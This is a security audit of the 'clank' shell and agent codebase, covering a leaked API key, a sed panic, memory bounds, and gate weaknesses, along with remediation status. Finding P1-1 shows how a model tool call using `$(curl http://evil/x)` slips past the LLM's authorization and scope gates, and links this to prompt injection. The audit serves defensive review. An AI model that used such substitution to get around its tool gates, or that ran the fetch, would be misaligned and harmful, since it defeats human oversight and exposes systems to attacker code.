# clank — Production-Readiness Audit

**Target:** `main-rc-1` (worktree `~/Desktop/clank-spike`), compared against `main`.
**Operation:** read-only — no build, lint, test, or network was run. Findings are graded accordingly.
**Confidence:** `Confirmed` (read the code, the claim follows) · `Likely` (pattern strong, some
context untraced — named) · `Unverified` (only a tool/run confirms — mapped in `VERIFY.md`).
**Branch tag:** `[both]` / `[main-rc-1 only]` / `[main only]`. Every finding has a `path:line`
anchor; quotes ≤3 lines. Findings from the parallel finder passes were **re-verified by me against
the live source** before inclusion.

> **Tone, honestly applied.** This is not a slop pile. The security-critical core — grease integrity,
> ed25519/RFC-6962 verification, the authorization gate, the model-tool scope gate — is careful,
> layered, fail-closed, and backed by *negative* tests. The dual-target `cfg` seams (a classic source
> of silent bugs) were checked pair-by-pair and are clean. So the findings below are specific, not a
> general indictment. Two of them are genuine blockers; fix those and the tail before shipping.

---

## Executive summary

| Severity | Count | Headlines |
|---|---|---|
| **P0** | 2 | API key logged in cleartext to `shell.log`; a reachable `sed` panic that traps the durable agent |
| **P1** | 5 | `$( )` bypasses the model-tool gate; no panic containment at the wasm export; two unbounded-memory leaks; inert http.log redaction |
| **P2** | 8 | grease trust-model limits; authz fail-open; `Debug` over secrets; unbounded/timeoutless HTTP; + 4 hygiene cross-refs |
| **P3** | 6 | polish + minor robustness |

**Density baseline** (tree, `target/` excluded): 905 `unwrap/expect` (434 in `session/tests.rs`;
much of the rest in per-file `#[cfg(test)]` too, so the reachable library surface is well under the
crude ~470); 315 `clone`; 63 `unwrap_or_default`; 184 `let _ =`; 16 narrowing `as`; 43 dual-target
`cfg` (all verified contract-matching); 0 `TODO`; 0 unbounded channels; 2 `spawn`.

---

## Remediation status (2026-07-23)

Fixes landed on `main-rc-1` (`0f0d964`..`65db82a`) and, for `[both]` findings, cherry-picked to
`main` (`e6c9c0d`..`4f01cc3`). Every fix carries a test; full native suite green (clank-shell 460/0),
clank-agent builds on wasm32-wasip2.

| Finding | Status | Where / why |
|---|---|---|
| **P0-1** key in shell.log | ✅ Fixed | `log_safe_line` now redacts `--key`/`--token`-style flag args (byte-exact) |
| **P0-2** sed `s///N` panic | ✅ Fixed | `captures_iter` (captures in full context); regression test |
| **P1-1** `$( )` model bypass | ✅ Fixed | model path fails closed on command/process substitution |
| **P1-2** no panic containment | ◐ Mitigated, not "fixed" | addressed by elimination (P0-2) + the clippy `unwrap_used` worklist; a blanket `catch_unwind` is a no-op under wasm `panic=abort` and arguably wrong for a durable agent (a trap is Golem's clean replay-safe failure) |
| **P1-3** `last_dropped` leak | ✅ Fixed | 128 KiB cap + discard on the no-model path |
| **P1-4** MAX_BODY post-hoc | ◐ Partial | Content-Length early-reject added (rc1-only); a hard streaming bound vs a chunked no-Content-Length server needs a verified `wstd` bounded read — deferred |
| **P1-5** inert http.log redaction | ✅ Fixed | deleted the dead `redact_header`/`redact_text` |
| **P2-1** indexless script/mcp | ⏸ Deferred | a blanket reject breaks local/dev registries; needs the `--allow-unverified` opt-in + test updates |
| **P2-2** authz fail-open | ⏸ Deferred | naive fail-closed fired on *incomplete* input (line continuation); needs to distinguish incomplete vs malformed |
| **P2-3** `Debug` over secrets | ✅ Fixed | manual redacting `Debug` for `ProviderSection`/`ClusterConfig` |
| **P2-4** no cap / no timeout | ◐ Partial | default outbound timeout added (native); body cap same residual as P1-4 |
| **P2-5** no lint/deny config | ◐ Partial | `deny.toml` + `rustfmt.toml` added; always-on `[workspace.lints]` deferred (triage the ~470 sites first) |
| **P2-6** stringly-typed errors | ⏸ Deferred | 119-site `thiserror` refactor — an epic, out of a bug-fix sweep |
| **P2-7** branch-pinned dep | ✅ Fixed | coreutils fork rev-pinned (`35ecf24`); `deny.toml` `sources` allowlist |
| **P2-8** false-confidence `expect`s | ▫ Not done | 14 sites; mostly sound, per-site triage deferred |
| **P3-1** `Decision::Deny` | ▫ Kept | the arms are exhaustiveness handlers; kept as a cheap future hard-deny hook |
| **P3-2** clone density | ⏸ Deferred | lint-driven (`redundant_clone`) |
| **P3-3** unsafe SAFETY docs | ✅ Fixed | `// SAFETY:` on each fd block; unchecked `dup2` noted |
| **P3-4** grease empty prompt | ✅ Fixed | failed `prompts/get` skips + notes, no empty persist |
| **P3-5** wcurl redirect cap | ✅ Fixed | pinned to 50 explicitly |
| **P3-6** weak parser test | ✅ Fixed | asserts no-op flags stay no-ops |

**Net:** 13 fixed, 3 partial, 5 deferred/kept — the 2 blockers and 3 of 5 P1s fully closed. The
deferred items are behavior-changing (P2-1), subtle (P2-2), or epics (P2-6); the partials have a
documented residual, not a regression. Details in `VERIFY.md`.

---

## P0 — Blockers

### [P0-1] The Anthropic API key is logged in cleartext to `shell.log` via `model add --key` · [both]

**Anchor:** `crates/clank-shell/src/session/mod.rs:1534` (`log_safe_line`), reached from the `start`
(`:480`) and `end` (`:494`) lifecycle events; redactor scope proven at
`crates/clank-shell/src/builtins/secretenv.rs:12`.
**Confidence:** Confirmed

Every command line is written to `shell.log` twice (start + end events) through `log_safe_line`,
which redacts **only** `export --secret NAME=VALUE`:

```rust
fn log_safe_line(line: &str) -> Cow<'_, str> {
    match crate::builtins::secretenv::redact_export_line(line) {
        Some(redacted) => Cow::Owned(redacted),
        None => Cow::Borrowed(line),   // model add --key … falls here, verbatim
```

`secretenv` states "**Only** the `export --secret NAME=VALUE` form is intercepted." The README's
native key-entry command `model add anthropic --key <KEY>` is not that form, so the key passes
through untouched — and the central `mask_values` filter cannot retroactively catch it, because the
key is never registered as an `export --secret` value (and the `start` event logs the line *before*
the command even runs). `model add` even comments "Never echo the value on any path"
(`ai/model.rs:194`), yet the raw line leaks. There is a test for the `export --secret` case, none for
`model add --key`.

**Why it matters:** a long-lived credential lands in cleartext, persisted on the durable agent's
filesystem, twice per invocation — the exact leak class the `export --secret` fix closed, left open
on the sibling command that also takes a secret.

**Suggested direction:** teach `log_safe_line` (or `redact_export_line`'s caller) to also redact the
`--key`/`--token` argument of `model add` (and any future secret-bearing command) — ideally by
detecting known secret-flag shapes structurally rather than per-command. Add the `model add --key`
redaction test alongside the existing `export` one.

### [P0-2] `sed` `s///N` panics on a context-dependent zero-width assertion — traps the durable agent · [both]

**Anchor:** `crates/clank-shell/src/tools/texttools.rs:789` (`replace_nth`), reached from the sed
`s///N` occurrence path (parsed ~`:638`, routed ~`:831`; sed is a registered builtin).
**Confidence:** Confirmed (the panic); Confirmed-by-corroboration (durable-instance wedge — memory
notes "traps wedge the agent"; exact Golem recovery semantics is the one Unverified bit → VERIFY)

`replace_nth` re-runs `captures` on the **isolated** match slice and unwraps:

```rust
let caps = re.captures(&text[m.start()..m.end()]).unwrap();
```

`find_iter` matched in full-text context, but a zero-width assertion (`\b`, `\B`, `^`, `$`,
lookaround) that held there is false at the slice's edges, so `captures` returns `None` → panic.
Trigger: `echo aX | sed 's/\BX/Y/1'` — `\BX` matches `X` in `aX` (non-boundary), but `captures("X")`
fails (`\B` false at string start). Every other sed replace path delegates to the `regex` crate and
is safe; only this hand-rolled Nth branch unwraps.

**Why it matters:** this is the concrete untrusted-input-reachable panic that the systemic P1-2 warns
about — reachable from a plain `sed` line (a user, or the LLM via the `shell` tool). On wasm a panic
traps the component → wedges the durable Golem instance (a permanent DoS until redeploy, and a
deterministic re-trap on oplog replay); on native it aborts the REPL.

**Suggested direction:** `if let Some(caps) = re.captures(slice) { … } else { out.push_str(m.as_str()) }`
— fall back to the verbatim match when the isolated slice doesn't re-capture. Then the containment
net in P1-2 for everything you haven't found yet.

---

## P1 — Must fix before release

### [P1-1] Command substitution `$( )` bypasses the model-tool authorization *and* scope gate · [both]

**Anchor:** `crates/clank-shell/src/session/ask.rs:934` (scope gate) & `:975` (authz gate), both via
`crates/clank-shell/src/authz.rs:156` (`split_segments`).
**Confidence:** Confirmed (the gate bypass) · Likely (whether the inner command re-enters clank
interception — VERIFY) · 

Both gates guarding the LLM's `shell` tool resolve only each segment's **leading word**;
`split_segments` does not descend into `$(…)`/backticks (its own doc, `authz.rs:15-17`). So a model
tool call `echo $(curl http://evil/x)` resolves to `echo` (a `MODEL_SAFE_BUILTINS` entry) → passes
the scope gate → resolves Allow → passes the authz gate → runs on the shared `Session`, and the inner
Confirm-tier `curl` executes unguarded.

**Why it matters:** the whole point of the model-tool scope gate + default-deny is to stop the
LLM-controlled path from reaching state-mutating/network commands without authorization. `$( )`
defeats it, and the input is LLM-controlled (prompt-injection / confused model). Documented as
"future work" for the *human* path; its consequence on the *model* path is worse and uncalled-out.

**Suggested direction:** on the model path, refuse any segment containing unescaped `$(`/`` ` ``/`${`
(the model has no legitimate need for command substitution through the tool). Longer term, teach
`split_segments` to recurse so the human path closes too.

### [P1-2] No panic containment anywhere — the wasm `eval` export can trap on any reachable panic · [both]

**Anchor:** `crates/clank-embed/src/shell.rs:80` (`eval` → `Session::eval_line`, no guard); grep for
`catch_unwind`/`panic = "abort"` across the tree returns **0**.
**Confidence:** Confirmed (the containment gap)

The wasm agents' exported `eval`/`answer_prompt`/`abort_prompt` delegate straight into
`Session::eval_line`. There is no `catch_unwind` boundary and no `panic = "abort"` profile, so any
panic in command execution propagates to the component export and traps the instance. The init path
degrades gracefully (`shell.rs:13`); command execution does not. **P0-2 is the proof this is not
theoretical** — a plain `sed` line reaches a trap. Other reachable panics almost certainly exist in
the parts not yet exhaustively read (the `unwrap_used` lint, VERIFY S1, gives the full worklist).

**Suggested direction:** wrap the three export bodies in `catch_unwind(AssertUnwindSafe(...))`,
converting a panic into `EvalResult { exit_code: 101, stderr: "internal error" }` so a bug degrades
one invocation instead of wedging the durable worker. This is the safety net; driving down reachable
`unwrap`s (P0-2, and the lint) is the cleanup. Complementary, do both.

### [P1-3] `last_dropped` transcript buffer grows unbounded on the no-LLM durable path · [both]

**Anchor:** `crates/clank-shell/src/lib.rs:223` (`stash_dropped` appends), `:329` (only drain, in
`set_marker_summary`), `:265` (`clear()` does **not** touch it); non-drain early-returns at
`crates/clank-shell/src/session/ask.rs:353-359`.
**Confidence:** Confirmed

Every evicted transcript entry's full rendered text (command + output) is appended to `last_dropped`
(`stash_dropped`, `self.last_dropped.extend_from_slice(...)`). The only code that clears it is
`set_marker_summary`, reached only when an LLM summary **succeeds**:

```rust
let model = match self.resolve_ask_model(None) { Ok((m,_)) => m, Err(_) => return }; // no drain
if let Ok(Some(summary)) = self.summarize_text(&dropped_text, &model).await { … } // Err/None → no drain
```

So with no API key, no provider (native / log-sink-only agent), or any transient LLM error, the
buffer accumulates the full text of every compacted entry for the instance's entire life. `clear()`
(the `context clear` path) does not reclaim it, and oplog replay re-accumulates it.

**Why it matters:** an unbounded RAM growth on a never-restarting durable agent — precisely the
population ("features that require Golem/LLM degrade to errors") where summarization always fails.

**Suggested direction:** cap `last_dropped` (drop-oldest past a byte budget), and drain it on the
non-summary paths too (keep the count marker, discard the text) rather than only on summary success.

### [P1-4] `MAX_BODY` is checked *after* the whole untrusted response is materialized — OOM before the cap runs · [main-rc-1 only]

**Anchor:** `crates/clank-embed/src/mcp_http.rs:66-71` and `crates/clank-embed/src/ask_provider.rs:90-95`.
**Confidence:** Confirmed · (RC-only: `clank-embed`'s HTTP providers do not exist on `main`)

```rust
let bytes = response.body_mut().contents().await … .to_vec(); // reads to EOF, unbounded
if bytes.len() > MAX_BODY { return Err(…); }                  // too late — already in RAM
```

The `MAX_BODY` constant (4 MiB MCP, 8 MiB LLM) bounds the *returned* value but not peak allocation. A
malicious or misconfigured MCP server / LLM endpoint (both untrusted) returning a multi-GB or
held-open body OOM-kills the durable worker before the cap is consulted — the protection the module
doc advertises does not actually protect memory.

**Suggested direction:** stream with a hard limit — read in a loop into a capped buffer and abort once
`MAX_BODY` is exceeded (`take(MAX_BODY as u64)` on the body reader), instead of `to_vec()`-then-check.

### [P1-5] The http.log secret-redaction contract is inert — `redact_header`/`redact_text` have zero callers · [both]

**Anchor:** `crates/clank-shell/src/logging.rs:248` (`redact_header`) & `:279` (`redact_text`) — a
tree-wide search (excluding tests) finds **no production caller**; the only live redactors are
`redact_url` and `mask_values`.
**Confidence:** Confirmed (dead code); leak latent

`redact_header`'s own doc says it exists "so LLM/MCP/registry calls never log API keys or auth
tokens." Nothing calls it. The stated "headers/tokens redacted from http.log" guarantee holds today
only because the three emit sites (`mcp/client.rs:92`, `session/mod.rs:1632`, `ai/ask.rs:362`) happen
to log no headers or bodies, and `mask_values` masks only `export --secret` values — not an
`ANTHROPIC_API_KEY` or an MCP bearer token.

**Why it matters:** a maintainer who adds header/body logging to http.log inherits a false safety net
— the redaction they think is protecting them is dead code. Combined with P0-1, secret handling has a
real hole and an inert guard.

**Suggested direction:** either wire `redact_header`/`redact_text` into `logging::append` (so all
http.log emission is filtered), or delete them and document that emit sites must never log
sensitive fields. Do not ship a redactor that nothing calls.

---

## P2 — Should fix

### [P2-1] grease trust model: indexless registries install on TOFU; the transparency root is self-asserted · [both]
**Anchor:** `session/grease.rs:173-181`, `:219-224`; single-leaf logs. **Confidence:** Confirmed. The
keyed+indexed path is genuinely fail-closed (see Strengths); but an indexless registry installs
arbitrary `script`/`mcp` packages on trust-on-first-use, and the inclusion proof is checked against
the registry's own advertised root, single-leaf per package — tamper-evidence relative to a root the
same registry supplied. **Direction:** make indexless install opt-in (`--allow-unverified`); reject
`script`/`mcp` from indexless registries; document that the root must be pinned out-of-band.

### [P2-2] Authorization gate fails **open** on a tokenize failure · [both]
**Anchor:** `authz.rs:44-45`, `:126-128` → default `Allow` (`:119`). **Confidence:** Likely
(exploitability needs Brush to run a line clank couldn't tokenize — same parser, so probably not;
untraced). A security gate should fail closed. **Direction:** return `Confirm` (or refuse on the model
path) on tokenize failure; test that a malformed line isn't silently authorized.

### [P2-3] `Debug` derived over structs holding secrets (latent — P0 the moment a `{:?}` is added) · [both]
**Anchor:** `ai/config.rs:44` `#[derive(…Debug…)]` over `ProviderSection { key: Option<String> }` (the
stored API key); `golem/config_native.rs:12` over `ClusterConfig { token: Option<String> }`.
**Confidence:** Confirmed (the derive) · Likely (no current `{:?}` sink — latent). **Direction:**
hand-write a redacting `Debug` for both (`key: <redacted>`); the derive is the footgun the moment any
containing struct is `Debug`-logged.

### [P2-4] Shared HTTP transport reads bodies with no size cap and no default timeout · [both]
**Anchor:** `whttp/src/lib.rs:288` (wasm) & `:343` (native) read the response to EOF with no limit;
`whttp/src/lib.rs:40` defaults `timeout`/`connect_timeout` to `None`; curl/wget set them only on
`-m`/`-T`. **Confidence:** Confirmed (no cap) · Likely (timeout consequence — depends on `wstd`
defaults + Golem per-agent serialization). `curl <huge-url>` OOMs; a hung peer with no `-m` blocks the
`.await` and, because the durable instance serializes invocations, wedges everything queued behind it.
**Direction:** a default body cap + a default request/connect timeout in `whttp`.

### [P2-5] No lint / advisory / format configuration · [both]
Cross-ref **RESTRUCTURE C1**. Only `rust-toolchain.toml` exists — no `[workspace.lints]`,
`clippy.toml`, `rustfmt.toml`, `deny.toml`. **Confidence:** Confirmed. The cheapest high-value fix;
converts much of this audit into standing warnings (the `unwrap_used` lint owns P1-2's worklist).

### [P2-6] Errors are uniformly `Result<_, String>` — no structured types · [both]
Cross-ref **RESTRUCTURE C2**. 119 `Result<_, String>`, 0 `thiserror`/`derive(Error)` in shipping
crates. **Confidence:** Confirmed. Callers can't match on failure kind. No `Box<dyn Error>` sits at a
*public* boundary and no unconstructed error-enum variants were found (both checked — clean).

### [P2-7] A `[patch]` dep is pinned to a git **branch**, not a rev (non-reproducible) · [both]
Cross-ref **RESTRUCTURE C5**. `uucore` + `uu_*` → fork `branch = "wasip2-oscompat"`. **Confidence:**
Confirmed. Drifts to branch-tip on fresh resolve; pin to a `rev`, mirror the single-maintainer forks.

### [P2-8] False-confidence `expect` messages · [both]
**Anchor:** 14 `expect("…should/always/never/must…")` sites. **Confidence:** Likely (per-site triage
needed). Most are sound (e.g. `ask.rs:478`'s "split_segments never returns empty" is backed by the
fallback) but the category should be walked; any reachable one joins P1-2.

---

## P3 — Polish & minor robustness

- **[P3-1] `Decision::Deny` is an unconstructed variant** · [both] — `authz.rs:69`; `decide()` never
  returns it, yet callers (`ask.rs:983`) must handle it. Wire a hard-deny policy or drop it. Confirmed.
- **[P3-2] `clone()` density** · [both] — 315 sites (~1/105 LOC). Run `redundant_clone` (VERIFY S1);
  aggregate cleanup. Likely.
- **[P3-3] `unsafe` fd blocks: non-canonical markers + unchecked `dup2`** · [both] —
  `tools/coreutils.rs:208-297`. The blocks are *careful* (thorough prose rationale; `mem::forget`
  before `__wasilibc_fd_renumber`), but lack `// SAFETY:` markers and ignore `dup`/`dup2` returns (fd
  exhaustion → mis-routed output, not unsound). Confirmed. `cargo miri` (VERIFY S8) confirms UB-freedom.
- **[P3-4] grease MCP install swallows a failed prompt fetch** · [both] —
  `session/grease.rs:387` `…get_prompt(...).await.unwrap_or_default()`: a transient `prompts/get`
  failure persists an **empty** prompt package; the user later runs it and gets a silently empty
  result. Confirmed. Fail the install instead.
- **[P3-5] `wcurl` never sets `max_redirects`** · [both] — `wcurl/src/lib.rs:66` inherits
  `whttp::Request::new`'s literal `50`; `waget` sets `20` explicitly (`waget/src/lib.rs:53`). Both
  match real-tool defaults today, so no live bug — but `curl -L`'s cap is an invisible dependency on a
  constant in a third crate. Confirmed. Pin it explicitly in wcurl.
- **[P3-6] Weak parser test + LLM-field defaults** · [both/rc1] —
  `waget/src/parse.rs:263` `accepted_no_ops_do_not_error` asserts only `.is_ok()`, not that the no-op
  flags stayed no-ops (a regression flipping one would still pass); `ai/anthropic_wire.rs:121-122`
  `block["id"/"name"].as_str().unwrap_or_default()` lets a malformed model `tool_use` drive an
  empty-named tool call. Confirmed. Low individual stakes.

---

## Strengths (where the reader can relax — verified, not assumed)

- **grease integrity is fail-closed and layered** (`session/grease.rs:140-240`) and the **crypto is
  careful** (`grease/pkg.rs:615-731`): `verify_strict`, length checks via `try_into`, RFC-8032 +
  reference-Merkle-tree tests with real *negative* cases (forged sig, tampered node, truncated proof).
- **The authorization gate and the model-tool scope gate both have real negative tests** —
  `sudo-only`-not-satisfied-by-"all", compound `split_segments`, `ask_recursion_is_refused`,
  `ask_shell_internal_command_is_refused`, `ask_compound_tool_call_cannot_smuggle_a_shell_internal`,
  `ask_unknown_tool_command_is_denied_but_safe_builtins_run` — modulo the `$( )` gap (P1-1).
- **Dual-target `cfg` drift: clean.** All ~43 native/wasm pairs implement the same contract; the
  classic drift trap (the `uucore` exit-code reset) is present in **both** twins
  (`coreutils.rs:243`/`:352`). No divergence found.
- **The `mcp/client.rs:763` noop-waker `unsafe` is sound *and* test-only** (inside `#[cfg(test)]`,
  never compiled into the agent/binary) — not a finding.
- **Concurrency surface is small and honest**: 2 `spawn`, 0 unbounded channels; the proc table and
  `pending_invocations` are explicitly bounded; the ask LLM http.log emitter logs no key/url/headers.

---

## Coverage ledger

**Read in full by the auditor:** `authz.rs`; `grease/pkg.rs`; `session/grease.rs` (install
enforcement); `session/ask.rs` (gates, `resolve_command_scope`); `clank-agent`/`greeter-agent`
`lib.rs`; `clank-embed/src/shell.rs`; `tools/coreutils.rs:198-298` (both `unsafe` fd paths);
`whttp/src/lib.rs` (scheme/URL); the specific anchors of every folded finding (re-verified);
all 10 `Cargo.toml`s.
**Covered by three re-verified finder passes:** error-handling & resource bounds; divergent
duplication, tests-that-don't-test, type-design, secret-leak trace; wasm `cfg` drift (all 43),
the waker `unsafe`, and untrusted-input panic hunting (found P0-2).
**Still not exhaustively examined (weigh as un-audited, not clean):** the *precise* reachable-from-
`eval` `unwrap` count (needs `unwrap_used`, VERIFY S1); type-design/tests across all of
`builtins/`/`runtime/`; the native Golem REST invoker path. The 4th finder pass (concrete panic-anchor
triage across the full tree) crashed twice and was partly reconstructed by direct reading + the wasm
finder's panic hunt; treat the panic surface as "one confirmed reachable trap (P0-2) plus an
unquantified remainder," not as fully enumerated.
